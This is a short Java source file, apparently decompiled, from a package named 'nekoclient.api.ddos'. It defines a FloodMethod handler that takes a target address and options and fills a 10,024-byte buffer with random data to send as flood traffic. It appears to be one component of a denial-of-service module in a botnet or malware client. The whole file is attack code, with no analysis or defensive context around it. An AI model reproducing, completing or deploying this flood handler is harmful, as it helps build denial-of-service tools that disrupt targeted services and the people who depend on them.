package dev.neko.nekoclient.api.ddos.impl.handler.impl.general;

import com.eclipsesource.json.JsonObject;
import dev.neko.nekoclient.api.ddos.Protocol;
import dev.neko.nekoclient.api.ddos.impl.handler.BufferWritingMethodHandler;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.util.Random;

public class FloodMethod extends BufferWritingMethodHandler {
   @Override
   public void init(Protocol protocol, InetSocketAddress address, String host, JsonObject options) {
      byte[] bytes = new byte[10024];
      new Random().nextBytes(bytes);
      this.buffer = ByteBuffer.wrap(bytes);
   }
}
